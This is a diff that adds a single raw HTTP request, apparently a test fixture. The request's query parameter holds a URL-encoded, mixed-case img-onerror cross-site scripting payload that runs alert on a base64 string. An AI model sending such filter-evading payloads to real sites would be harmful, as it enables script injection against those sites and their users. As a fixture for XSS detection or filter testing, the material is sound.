@@ -1,0 +1,4 @@
+GET /a?path=<iMg%20SrC%3D"x"%20OnErRoR%3D"aLeRt(AtOb('YwXlCnQoMsK%3D'))"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
